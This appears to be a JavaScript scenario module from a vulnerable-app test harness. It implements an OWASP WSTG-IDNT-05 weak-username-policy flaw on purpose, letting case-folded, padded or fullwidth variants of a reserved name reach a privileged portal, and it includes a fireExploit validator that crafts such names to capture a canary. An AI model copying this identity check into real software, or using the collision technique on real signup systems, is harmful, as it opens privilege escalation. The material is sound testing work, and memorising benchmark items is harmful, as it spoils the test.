// WSTG-IDNT-05 (4.3.5) — Weak Username Policy behaviour.
//
// Signup accepts any username — no reserved-name list, no normalisation-
// equivalence check. The portal's identity-check normalises the submitted
// username (case-fold / whitespace-trim / NFKC) and compares against the
// internal reserved name. A user who signed up with a name that
// normalises to the reserved name is treated as that privileged identity.

import { Scenario } from './scenario.mjs'

// Per-session in-memory store: session-id -> username (as submitted).
const sessions = new Map()

function normalise(username, vector) {
  if (typeof username !== 'string') return ''
  if (vector === 'case-fold') return username.toLowerCase()
  if (vector === 'whitespace-trim') return username.trim()
  if (vector === 'unicode-nfkc') return username.normalize('NFKC').toLowerCase()
  return username
}

export const classDef = {
  wstgId: 'WSTG-IDNT-05',
  class: 'Weak or Unenforced Username Policy',
  defenceTiers: [0],
  Scenario,
  supportsSignup: true,
  needsSignup: true,
  canaryRuntime: true,
  discoveryMode: 'observation',
  discoveryTargetPath: () => '/signup',
  discoveryStaticOk: (s) =>
    typeof s.chromeInjection?.html === 'string' && s.chromeInjection.html.includes('/signup'),

  // Custom signup form — username field, no reserved-name filter.
  renderSignupForm({ scenario, errorMsg, escapeHtml }) {
    const copy = scenario.signupFormCopy
    const sub = copy.subheading ? `<p style="color:#666;margin:0 0 12px">${escapeHtml(copy.subheading)}</p>` : ''
    const err = errorMsg ? `<p style="color:#b00;margin:0 0 12px">${escapeHtml(errorMsg)}</p>` : ''
    return `<section style="max-width:440px;margin:48px auto;padding:24px">
      <h1 style="margin:0 0 8px;font-size:26px">${escapeHtml(copy.heading)}</h1>
      ${sub}${err}
      <form method="POST" action="/signup" style="display:flex;flex-direction:column;gap:12px">
        <label style="display:flex;flex-direction:column;gap:4px">
          <span style="font-size:13px">Email</span>
          <input type="email" name="email" required style="padding:9px 12px;border:1px solid #ccc;border-radius:6px;font-size:14px">
        </label>
        <label style="display:flex;flex-direction:column;gap:4px">
          <span style="font-size:13px">Username</span>
          <input type="text" name="username" required style="padding:9px 12px;border:1px solid #ccc;border-radius:6px;font-size:14px">
        </label>
        <button type="submit" style="padding:10px 14px;background:#1c1917;color:white;border:none;border-radius:6px;font-size:14px;cursor:pointer">${escapeHtml(copy.ctaLabel)}</button>
      </form>
    </section>`
  },

  async onSignup({ sessionId, signupData }) {
    const username = (signupData.form?.username || '').toString()
    sessions.set(sessionId, username)
    return {}
  },

  matchesRequest({ reqUrl, req, scenario }) {
    return req.method === 'GET' && reqUrl.pathname === scenario.memberPortalPath
  },

  async handleRequest({ scenario, session, renderPage, manifest }) {
    if (!session || !sessions.has(session)) {
      return { status: 302, headers: { Location: '/signup' }, body: '' }
    }
    const username = sessions.get(session)
    const normalised = normalise(username, scenario.collisionVector)
    // VULN: signup didn't filter reserved names, and the portal normalises
    // for the identity check. A submitted-name that normalises to the
    // reserved name is treated as the privileged identity.
    if (normalised === scenario.reservedInternalName.toLowerCase()) {
      return { status: 200, body: renderPage(scenario.privilegedPortalBody.replaceAll('{CANARY}', manifest.perDeployCanary)) }
    }
    const body = scenario.memberPortalBody.replaceAll('{USERNAME}', escapeHtml(username))
    return { status: 200, body: renderPage(body) }
  },

  // Validator: sign up with a username crafted to collide with
  // reservedInternalName under the scenario's collisionVector; the portal
  // renders the privileged body with the canary.
  async fireExploit({ baseUrl, scenario }) {
    let collidingName
    if (scenario.collisionVector === 'case-fold') {
      collidingName = scenario.reservedInternalName.toUpperCase()
    } else if (scenario.collisionVector === 'whitespace-trim') {
      collidingName = ' ' + scenario.reservedInternalName + ' '
    } else if (scenario.collisionVector === 'unicode-nfkc') {
      // Use a fullwidth equivalent — `ＡＤＭＩＮ` (U+FF21…) NFKC-normalises
      // to ASCII "ADMIN", then case-fold makes it "admin".
      collidingName = [...scenario.reservedInternalName.toUpperCase()]
        .map(c => String.fromCharCode(0xFF21 + (c.charCodeAt(0) - 0x41)))
        .join('')
    } else {
      collidingName = scenario.reservedInternalName
    }
    const signupRes = await fetch(`${baseUrl}/signup`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `email=tester%40example.com&username=${encodeURIComponent(collidingName)}`,
      redirect: 'manual',
    })
    const setCookie = signupRes.headers.get('set-cookie') || ''
    const m = setCookie.match(/session=([^;]+)/)
    if (!m) return { status: signupRes.status, body: '(no session cookie)' }
    const cookie = `session=${m[1]}`
    const r = await fetch(`${baseUrl}${scenario.memberPortalPath}`, { headers: { Cookie: cookie } })
    return { status: r.status, body: await r.text() }
  },

  exploitSuccessCriterion: ({ responseBody, perDeployCanary }) =>
    responseBody.includes(perDeployCanary),
}

function escapeHtml(s) {
  return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
}
